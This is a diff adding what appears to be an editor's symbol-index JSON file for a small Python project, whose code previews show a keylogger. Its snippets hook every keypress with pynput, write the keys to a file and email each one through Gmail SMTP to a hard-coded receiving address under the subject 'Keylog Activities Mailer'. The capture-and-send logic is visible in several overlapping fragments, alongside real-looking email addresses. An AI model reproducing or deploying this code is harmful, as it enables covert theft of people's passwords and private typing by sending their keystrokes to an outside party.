@@ -1,0 +1,168 @@
+[
+    {
+        "label": "pynput",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "pynput",
+        "description": "pynput",
+        "detail": "pynput",
+        "documentation": {}
+    },
+    {
+        "label": "Listener",
+        "importPath": "pynput.keyboard",
+        "description": "pynput.keyboard",
+        "isExtraImport": true,
+        "detail": "pynput.keyboard",
+        "documentation": {}
+    },
+    {
+        "label": "Key",
+        "importPath": "pynput.keyboard",
+        "description": "pynput.keyboard",
+        "isExtraImport": true,
+        "detail": "pynput.keyboard",
+        "documentation": {}
+    },
+    {
+        "label": "send",
+        "importPath": "mailer",
+        "description": "mailer",
+        "isExtraImport": true,
+        "detail": "mailer",
+        "documentation": {}
+    },
+    {
+        "label": "smtplib,",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "smtplib.",
+        "description": "smtplib.",
+        "detail": "smtplib.",
+        "documentation": {}
+    },
+    {
+        "label": "os",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "os",
+        "description": "os",
+        "detail": "os",
+        "documentation": {}
+    },
+    {
+        "label": "smtplib",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "smtplib",
+        "description": "smtplib",
+        "detail": "smtplib",
+        "documentation": {}
+    },
+    {
+        "label": "MIMEText",
+        "importPath": "email.mime.text",
+        "description": "email.mime.text",
+        "isExtraImport": true,
+        "detail": "email.mime.text",
+        "documentation": {}
+    },
+    {
+        "label": "MIMEMultipart",
+        "importPath": "email.mime.multipart",
+        "description": "email.mime.multipart",
+        "isExtraImport": true,
+        "detail": "email.mime.multipart",
+        "documentation": {}
+    },
+    {
+        "label": "onPress",
+        "kind": 2,
+        "importPath": "logger.keylogger",
+        "description": "logger.keylogger",
+        "peekOfCode": "def onPress(key):\n    keys.append(key)\n    write_file(keys)\n    try:\n        print(key.char)\n    except AttributeError:\n        print(key)\ndef write_file(keys):\n    with open(\"inputs.txt\", \"w\") as f:\n        for key in keys:",
+        "detail": "logger.keylogger",
+        "documentation": {}
+    },
+    {
+        "label": "write_file",
+        "kind": 2,
+        "importPath": "logger.keylogger",
+        "description": "logger.keylogger",
+        "peekOfCode": "def write_file(keys):\n    with open(\"inputs.txt\", \"w\") as f:\n        for key in keys:\n            key1 = str(key).replace(\"'\", \"\")\n            key2 = str(key1).replace(\"Key\", \"\\n Key\")\n            f.write(key2)\n            send(key2)\n            # mailMeInputs()\ndef on_release(key):\n    # print('{0} released'. format(key))",
+        "detail": "logger.keylogger",
+        "documentation": {}
+    },
+    {
+        "label": "on_release",
+        "kind": 2,
+        "importPath": "logger.keylogger",
+        "description": "logger.keylogger",
+        "peekOfCode": "def on_release(key):\n    # print('{0} released'. format(key))\n    if key == Key.esc :\n        return False;\nwith Listener(on_press = onPress, on_release = on_release) as listener:\n    listener.join()",
+        "detail": "logger.keylogger",
+        "documentation": {}
+    },
+    {
+        "label": "keys",
+        "kind": 5,
+        "importPath": "logger.keylogger",
+        "description": "logger.keylogger",
+        "peekOfCode": "keys = []\ndef onPress(key):\n    keys.append(key)\n    write_file(keys)\n    try:\n        print(key.char)\n    except AttributeError:\n        print(key)\ndef write_file(keys):\n    with open(\"inputs.txt\", \"w\") as f:",
+        "detail": "logger.keylogger",
+        "documentation": {}
+    },
+    {
+        "label": "sen",
+        "kind": 2,
+        "importPath": "logger.mailer",
+        "description": "logger.mailer",
+        "peekOfCode": "def send (content) :\n    # Create the email message\n    message = MIMEMultipart()\n    message['From'] = sender_email\n    message['To'] = receiver_email\n    message['Subject'] = subject\n    message.attach(MIMEText(content, 'plain'))\n    # Establish a connection to the SMTP server (in this case, Gmail's SMTP server)\n    with smtplib.SMTP('smtp.gmail.com', 587) as server:\n        # Start the TLS (Transport Layer Security) connection",
+        "detail": "logger.mailer",
+        "documentation": {}
+    },
+    {
+        "label": "sender_email",
+        "kind": 5,
+        "importPath": "logger.mailer",
+        "description": "logger.mailer",
+        "peekOfCode": "sender_email = \"lilraxpa@gmail.com\"\nreceiver_email = 'ameh4dev@gmail.com'\nsubject = 'Keylog Activities Mailer'\n# body = 'content'\n# Gmail configuration\ngmail_user = os.environ.get('EMAIL_ADDRESS')\ngmail_password = os.environ.get('EMAIL_PASSWORD')\ndef send (content) :\n    # Create the email message\n    message = MIMEMultipart()",
+        "detail": "logger.mailer",
+        "documentation": {}
+    },
+    {
+        "label": "receiver_email",
+        "kind": 5,
+        "importPath": "logger.mailer",
+        "description": "logger.mailer",
+        "peekOfCode": "receiver_email = 'ameh4dev@gmail.com'\nsubject = 'Keylog Activities Mailer'\n# body = 'content'\n# Gmail configuration\ngmail_user = os.environ.get('EMAIL_ADDRESS')\ngmail_password = os.environ.get('EMAIL_PASSWORD')\ndef send (content) :\n    # Create the email message\n    message = MIMEMultipart()\n    message['From'] = sender_email",
+        "detail": "logger.mailer",
+        "documentation": {}
+    },
+    {
+        "label": "subject",
+        "kind": 5,
+        "importPath": "logger.mailer",
+        "description": "logger.mailer",
+        "peekOfCode": "subject = 'Keylog Activities Mailer'\n# body = 'content'\n# Gmail configuration\ngmail_user = os.environ.get('EMAIL_ADDRESS')\ngmail_password = os.environ.get('EMAIL_PASSWORD')\ndef send (content) :\n    # Create the email message\n    message = MIMEMultipart()\n    message['From'] = sender_email\n    message['To'] = receiver_email",
+        "detail": "logger.mailer",
+        "documentation": {}
+    },
+    {
+        "label": "gmail_user",
+        "kind": 5,
+        "importPath": "logger.mailer",
+        "description": "logger.mailer",
+        "peekOfCode": "gmail_user = os.environ.get('EMAIL_ADDRESS')\ngmail_password = os.environ.get('EMAIL_PASSWORD')\ndef send (content) :\n    # Create the email message\n    message = MIMEMultipart()\n    message['From'] = sender_email\n    message['To'] = receiver_email\n    message['Subject'] = subject\n    message.attach(MIMEText(content, 'plain'))\n    # Establish a connection to the SMTP server (in this case, Gmail's SMTP server)",
+        "detail": "logger.mailer",
+        "documentation": {}
+    },
+    {
+        "label": "gmail_password",
+        "kind": 5,
+        "importPath": "logger.mailer",
+        "description": "logger.mailer",
+        "peekOfCode": "gmail_password = os.environ.get('EMAIL_PASSWORD')\ndef send (content) :\n    # Create the email message\n    message = MIMEMultipart()\n    message['From'] = sender_email\n    message['To'] = receiver_email\n    message['Subject'] = subject\n    message.attach(MIMEText(content, 'plain'))\n    # Establish a connection to the SMTP server (in this case, Gmail's SMTP server)\n    with smtplib.SMTP('smtp.gmail.com', 587) as server:",
+        "detail": "logger.mailer",
+        "documentation": {}
+    }
+]
